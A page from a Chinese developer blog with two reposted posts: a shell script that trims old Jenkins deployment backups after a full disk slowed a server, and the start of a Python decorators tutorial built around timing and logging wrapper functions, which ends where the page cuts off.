<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<meta name="referrer" content="never">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="../../lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="../../lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="../../css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="../../images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="../../images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="../../images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="../../atom.xml" title="开发者博客 – IT技术 尽在开发者博客" type="application/atom+xml">






<meta property="og:type" content="website">
<meta property="og:title" content="开发者博客 – IT技术 尽在开发者博客">
<meta property="og:url" content="https://dev.newban.cn/page/359/index.html">
<meta property="og:site_name" content="开发者博客 – IT技术 尽在开发者博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="开发者博客 – IT技术 尽在开发者博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>
<!--谷歌广告验证代码-->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-2626449904708114",
          enable_page_level_ads: true
     });
</script>
<!--谷歌广告验证代码-->



  <link rel="canonical" href="https://dev.newban.cn/page/359/">





  <title>开发者博客 – IT技术 尽在开发者博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">开发者博客 – IT技术 尽在开发者博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">开发者博客 – 科技是第一生产力</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="http://dev.newban.cn/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="https://dev.newban.cn/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520324288526.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520324288526.html" itemprop="url">线上问题解决及shell脚本实现自动保留最近n次备份记录 项</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T20:12:19+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="&#x9879;&#x76EE;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;"><a href="#&#x9879;&#x76EE;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;" class="headerlink" title="&#x9879;&#x76EE;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;"></a>&#x9879;&#x76EE;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;</h1><p>&#x67D0;&#x5929;&#x4E0A;&#x5348;&#x670D;&#x52A1;&#x5668;&#x51FA;&#x73B0;&#x5361;&#x987F;&#x7279;&#x522B;&#x4E25;&#x91CD;&#xFF0C;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x901F;&#x5EA6;&#x5947;&#x6162;&#xFF0C;&#x5E76;&#x4E14;&#x67D0;&#x4E9B;&#x9875;&#x9762;&#x5237;&#x65B0;&#x51FA;&#x73B0;404&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x8FDE;&#x670D;&#x52A1;&#x5668;&#x7684;tab&#x547D;&#x4EE4;&#x7684;&#x81EA;&#x52A8;&#x63D0;&#x793A;&#x90FD;&#x51FA;&#x73B0;&#x4E86;&#x95EE;&#x9898;&#xFF0C;&#x697C;&#x4E3B;&#x8D39;&#x4E86;&#x4E5D;&#x725B;&#x4E8C;&#x864E;&#x4E4B;&#x529B;&#xFF0C;&#x6839;&#x636E;&#x670D;&#x52A1;&#x5668;&#x6392;&#x67E5;&#x53D1;&#x73B0;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x76D8;&#x51FA;&#x73B0;100%&#x88AB;&#x5360;&#x7528;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x8BE5;&#x95EE;&#x9898;&#x51FA;&#x73B0;&#x7684;&#x539F;&#x56E0;&#x662F;&#xFF0C;Jenkins&#x6BCF;&#x6B21;&#x90E8;&#x7F72;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x4E0A;&#x4E00;&#x6B21;&#x7684;war&#x5907;&#x4EFD;&#xFF0C;&#x7531;&#x4E8E;&#x5F00;&#x53D1;&#x9636;&#x6BB5;&#x7684;&#x9891;&#x7E41;&#x90E8;&#x7F72;&#xFF0C;&#x6700;&#x7EC8;&#x786C;&#x76D8;&#x88AB;&#x5360;&#x6EE1;&#xFF0C;&#x4FBF;&#x51FA;&#x73B0;&#x4E0A;&#x8FF0;&#x63CF;&#x8FF0;&#x7684;&#x60C5;&#x51B5;&#x3002;</p>
<h1 id="&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;"><a href="#&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;"></a>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;</h1><h2 id="&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;"><a href="#&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;" class="headerlink" title="&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;"></a>&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;</h2><p>&#x6839;&#x636E;Google&#x7238;&#x7238;&#x7684;&#x63D0;&#x793A;&#xFF0C;&#x697C;&#x4E3B;&#x627E;&#x5230;&#x4E86;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;&#xFF0C;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;find &#x5BF9;&#x5E94;&#x76EE;&#x5F55; -mtime +&#x5929;&#x6570; -name &quot;&#x6587;&#x4EF6;&#x540D;&quot; -exec rm -rf {} \;</span><br></pre></td></tr></table></figure>

<p>&#x5B9E;&#x4F8B;&#x547D;&#x4EE4;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;find /opt/soft/log/ -mtime +30 -name &quot;*.log&quot; -exec rm -rf {} \;</span><br></pre></td></tr></table></figure>

<p><strong>&#x8BF4;&#x660E;&#xFF1A;</strong></p>
<p>&#x5C06;/opt/soft/log/&#x76EE;&#x5F55;&#x4E0B;&#x6240;&#x6709;30&#x5929;&#x524D;&#x5E26;&#x201D;.log&#x201D;&#x7684;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x3002;</p>
<p><strong>&#x5177;&#x4F53;&#x53C2;&#x6570;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#xFF1A;</strong></p>
<p>find&#xFF1A;linux&#x7684;&#x67E5;&#x627E;&#x547D;&#x4EE4;&#xFF0C;&#x7528;&#x6237;&#x67E5;&#x627E;&#x6307;&#x5B9A;&#x6761;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#xFF1B;<br>/opt/soft/log/&#xFF1A;&#x60F3;&#x8981;&#x8FDB;&#x884C;&#x6E05;&#x7406;&#x7684;&#x4EFB;&#x610F;&#x76EE;&#x5F55;&#xFF1B;<br>-mtime&#xFF1A;&#x6807;&#x51C6;&#x8BED;&#x53E5;&#x5199;&#x6CD5;&#xFF1B;<br>+30&#xFF1A;&#x67E5;&#x627E;30&#x5929;&#x524D;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x6570;&#x5B57;&#x4EE3;&#x8868;&#x5929;&#x6570;&#xFF1B;<br>&#x201C; &#xD7;.log&#x201D;&#xFF1A;&#x5E0C;&#x671B;&#x67E5;&#x627E;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x201D;&#xD7;.jpg&#x201D;&#x8868;&#x793A;&#x67E5;&#x627E;&#x6269;&#x5C55;&#x540D;&#x4E3A;jpg&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x201D;&#xD7;&#x201D;&#x8868;&#x793A;&#x67E5;&#x627E;&#x6240;&#x6709;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E2A;&#x53EF;&#x4EE5;&#x7075;&#x6D3B;&#x8FD0;&#x7528;&#xFF0C;&#x4E3E;&#x4E00;&#x53CD;&#x4E09;&#xFF1B;<br>-exec&#xFF1A;&#x56FA;&#x5B9A;&#x5199;&#x6CD5;&#xFF1B;<br>rm -rf&#xFF1A;&#x5F3A;&#x5236;&#x5220;&#x9664;&#x6587;&#x4EF6;&#xFF0C;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF1B;<br>{} ; &#xFF1A;&#x56FA;&#x5B9A;&#x5199;&#x6CD5;&#xFF0C;&#x4E00;&#x5BF9;&#x5927;&#x62EC;&#x53F7;+&#x7A7A;&#x683C;++;</p>
<p><strong>&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x7684;&#x601D;&#x8DEF;&#xFF1A;</strong></p>
<p>&#x5F53;&#x7136;&#x697C;&#x4E3B;&#x5F53;&#x7136;&#x4E0D;&#x80FD;&#x50BB;&#x4E4E;&#x4E4E;&#x7684;&#x5C06;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x90FD;&#x5220;&#x9664;&#x6389;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#xFF0C;&#x5907;&#x4EFD;&#x4E0D;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x610F;&#x4E49;&#x3002;<br>&#x6240;&#x4EE5;&#x6362;&#x4E00;&#x4E0B;&#x601D;&#x8DEF;&#x4FBF;&#x6709;&#x4E86;&#x4E0B;&#x9762;&#x7684;&#x547D;&#x4EE4;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;find ${BAK_HOME} -mtime +1 -name &quot;*:*&quot; | wc -l</span><br></pre></td></tr></table></figure>

<p><strong>&#x8BF4;&#x660E;&#xFF1A;</strong></p>
<p>&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x6240;&#x6709;&#x4E00;&#x5929;&#x524D;&#x5E26;&#x201D;&#xFF1A;&#x201D;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6570;&#x91CF;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;find ${BAK_HOME} -mtime +1 -name &quot;*:*&quot;</span><br></pre></td></tr></table></figure>

<p><strong>&#x8BF4;&#x660E;&#xFF1A;</strong></p>
<p>&#x83B7;&#x53D6;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E0B;&#x6240;&#x6709;&#x4E00;&#x5929;&#x524D;&#x5E26;&#x201D;&#xFF1A;&#x201D;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6570;&#x91CF;&#x3002;</p>
<p>&#x5230;&#x4E86;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7684;&#x95EE;&#x9898;&#x5DEE;&#x4E0D;&#x591A;&#x5C31;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x4E86;&#x3002;so&#xFF0C;&#x8BF7;&#x63A5;&#x7740;&#x5F80;&#x4E0B;&#x770B;&#xFF1A;</p>
<h2 id="&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x601D;&#x8DEF;&#x53CA;shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;"><a href="#&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x601D;&#x8DEF;&#x53CA;shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;" class="headerlink" title="&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x601D;&#x8DEF;&#x53CA;shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;"></a>&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x7684;&#x601D;&#x8DEF;&#x53CA;shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;</h2><h2 id="&#x601D;&#x8DEF;"><a href="#&#x601D;&#x8DEF;" class="headerlink" title="&#x601D;&#x8DEF;"></a>&#x601D;&#x8DEF;</h2><p>&#x76EE;&#x524D;&#x89E3;&#x51B3;&#x8BE5;&#x95EE;&#x9898;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5728;&#x539F;&#x6765;&#x90E8;&#x7F72;&#x811A;&#x672C;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6BB5;&#x811A;&#x672C;,&#x5B9E;&#x73B0;&#x4FDD;&#x7559;&#x6700;&#x8FD1;10&#x6B21;&#x90E8;&#x7F72;&#x7684;&#x5907;&#x4EFD;&#x8BB0;&#x5F55;,&#x8D85;&#x8FC7;10&#x6B21;&#x7684;&#x5907;&#x4EFD;&#x8BB0;&#x5F55;&#x5C06;&#x88AB;&#x5220;&#x9664;.</p>
<h2 id="shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;"><a href="#shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;" class="headerlink" title="shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;"></a>shell&#x811A;&#x672C;&#x7684;&#x5B9E;&#x73B0;</h2><p>&#x903B;&#x8F91;&#x5F88;&#x6E05;&#x6670;&#xFF0C;&#x601D;&#x8DEF;&#x5F88;&#x660E;&#x4E86;&#xFF0C;&#x6211;&#x5C31;&#x4E0D;&#x5728;&#x8FD9;&#x91CC;&#x63A5;&#x7740;&#x9610;&#x8FF0;&#x4E86;&#xFF0C;&#x8C22;&#x8C22;&#x5927;&#x5BB6;&#xFF01;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;#!/bin/sh</span><br><span class="line">BAK_HOME=&quot;/home/saveHistoryData/iam-share-8083&quot;</span><br><span class="line"></span><br><span class="line">keepNum=5</span><br><span class="line">fileNum=$(find ${BAK_HOME} -mtime +1 -name &quot;*:*&quot; | wc -l)</span><br><span class="line"></span><br><span class="line">echo &quot;${fileNum}&quot;</span><br><span class="line"></span><br><span class="line">for file in $(find ${BAK_HOME} -mtime +1 -name &quot;*:*&quot;); do</span><br><span class="line">    if test $[fileNum] -gt $[keepNum];then</span><br><span class="line">       rm -rf ${file}</span><br><span class="line">       fileNum=${fileNum}-1</span><br><span class="line">       echo &quot;delete backup file&quot;</span><br><span class="line">    else</span><br><span class="line">       echo &quot;do no thing&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/2bd1a4e2bd1b8607ae703573e4f5a883.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520252985352.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520252985352.html" itemprop="url">从头开始学习Python装饰器 Python Decorat</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T16:13:54+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Python-Decorators-From-the-Ground-Up"><a href="#Python-Decorators-From-the-Ground-Up" class="headerlink" title="Python Decorators From the Ground Up"></a>Python Decorators From the Ground Up</h1><p>Decorators are your friends. Despite this they tend to be seen as a rather obscure feature and are often left horribly neglected. In this post I will show you that decorators don&#x2019;t need to be complicated and that, when used correctly, can become<br> your MVP in many situations.</p>
<p>I won&#x2019;t just tell you what decorators are, but rather build a bottom up journey where we assemble a decorator from scratch, step by step. I&#x2019;ll visit the different ideas that make up the decorator idiom and the specific issues they aim to solve.<br> Hopefully by the end of your reading you will be able to identify the scenarios where decorators excel and the reason they became part of the python language.</p>
<p>Let&#x2019;s begin with a very realistic example:</p>
<h1 id="The-Algorithm-of-Love"><a href="#The-Algorithm-of-Love" class="headerlink" title="The Algorithm of Love"></a>The Algorithm of Love</h1><p>Imagine you are working on a dating platform that lets users find hot singles in their area. Your matching algorithm, based on some vague search criteria, is able to retrieve perfect matches from the user registry:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def hottie_lookup(search_criteria):</span><br><span class="line">    print(&apos;Querying hotties database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    #Simulate patended algorithm to find hot singles in your area</span><br><span class="line">    time.sleep(2) </span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>In no time your platform becomes very popular. Even though people really seem love it, you have heard some complaints about long response times. You decide to measure the execution time of your love algorithm:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def hottie_lookup(search_criteria):</span><br><span class="line"></span><br><span class="line">    current_time = time.time()</span><br><span class="line"></span><br><span class="line">    print(&apos;Querying hotties database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    time.sleep(2) </span><br><span class="line">    #Simulate patended algorithm to find hot singles in your area</span><br><span class="line"></span><br><span class="line">    print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line"></span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>After the great success you decide that it would be useful to gather some usage statistics: What are the most popular searching criteria (besides hotness off course)? What are the most popular singles in town?</p>
<p>For this you decide to log every received request and its corresponding response:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def hottie_lookup(search_criteria):</span><br><span class="line"></span><br><span class="line">    print(&quot;Request was made:&quot;, search_criteria)</span><br><span class="line">    current_time = time.time()</span><br><span class="line"></span><br><span class="line">    print(&apos;Querying hotties database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    #Simulate patented algorithm to find hot singles in your area</span><br><span class="line">    time.sleep(2) </span><br><span class="line"></span><br><span class="line">    print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">    print(&quot;Matching entries found:&quot;, search_results)</span><br><span class="line"></span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>Your matching algorithm works so well that the majority of your users found their true love, and, as your analytics show, a clear decay in traffic is evident. You meditate on this and discover that your algorithm could be generalized to solve<br> other kinds of matching problems, such as finding the more skilful gardeners in town:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def gardener_lookup(search_criteria):</span><br><span class="line"></span><br><span class="line">    print(&quot;Request was made&quot;, search_criteria)</span><br><span class="line">    current_time = time.time()</span><br><span class="line">    </span><br><span class="line">    print(&apos;Querying gardeners database...&apos;)</span><br><span class="line">    search_results = []</span><br><span class="line">    #Simulate patended algorithm to find skillful gardeners in town</span><br><span class="line">    time.sleep(2) </span><br><span class="line"></span><br><span class="line">    print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">    print(&quot;Matching entries found:&quot;, search_results)</span><br><span class="line"></span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>Perfect! You can now use your magical matching solution for the sake of perfectly mowed lawns and less awkward family gatherings. Now, is this the best way of solving this? not really, there are a few issues with this design:</p>
<h3 id="Code-Duplication"><a href="#Code-Duplication" class="headerlink" title="Code Duplication"></a>Code Duplication</h3><p>It&#x2019;s clear that in our services, hotties and gardeners search, functionality has to be replicated: both need to be timed and logged. This is bad, since every time we need to add a new service the same stuff needs to be reimplemented.</p>
<p>Image that we receive the requirement to authenticate users before each database lookup, then we would then need to implement user authenticaion in every single service. What if we had a few dozen services? Embarrassing.</p>
<h3 id="Single-Responsibility-Principle"><a href="#Single-Responsibility-Principle" class="headerlink" title="Single Responsibility Principle"></a>Single Responsibility Principle</h3><p>In our functions, which are supposed to run awesome ranking algorithms to retrieve perfect matches from the database, we are suddenly measuring time and persisting analytics. Our functions are polluted, have several reasons to change and break<br> the single responsibility principle. Shame.</p>
<h1 id="Wrapper-Functions"><a href="#Wrapper-Functions" class="headerlink" title="Wrapper Functions"></a>Wrapper Functions</h1><p>Clearly polluting our lookup functions with extra functionality isn&#x2019;t the best idea. But, how can we time our functions while leaving them unchanged? Maybe we can <em>wrap</em> them inside another function:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;import time</span><br><span class="line"></span><br><span class="line">def hottie_lookup_timed(search_criteria):</span><br><span class="line">    current_time = time.time()</span><br><span class="line">    # Call original unchanged hottie_lookup</span><br><span class="line">    search_results = hottie_lookup(search_criteria) </span><br><span class="line">    print(&quot;Request took {:.1f}s&quot;.format(time.time()-current_time))</span><br><span class="line">    return search_results</span><br></pre></td></tr></table></figure>

<p>Is this better? well, kinda, at least <code>hottie_lookup()</code> doesn&#x2019;t need to worry about measuring execution time anymore. But what about request and response logging? we could write a wrapper function of our wrapper function dawg:</p>
